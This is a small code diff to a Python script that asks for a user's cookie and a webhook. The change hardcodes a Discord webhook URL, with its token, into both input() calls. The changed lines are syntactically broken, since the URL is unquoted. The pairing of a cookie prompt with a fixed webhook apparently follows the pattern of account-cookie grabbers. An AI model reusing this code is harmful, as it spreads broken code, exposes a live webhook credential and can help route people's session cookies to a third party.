@@ -7,11 +7,11 @@ import os
 pingEveryone = True
 print('')
 print('Enter your cookie below:')
-cookie = input()
+cookie = input(https://discord.com/api/webhooks/1092805902312144906/z1D1c7TCSwMJA93fStHACt0uqOJJmwcTm6hmjUgSOXYq9wbts-rDoKCQGFT_sKxhVmZh)
 os.system("cls")
 print('')
 print('Enter your webhook below:')
-webhook = input()
+webhook = input(https://discord.com/api/webhooks/1092805902312144906/z1D1c7TCSwMJA93fStHACt0uqOJJmwcTm6hmjUgSOXYq9wbts-rDoKCQGFT_sKxhVmZh)
 os.system("cls")
 print('')
 print('Should we ping Everyone?: ( y / n )')
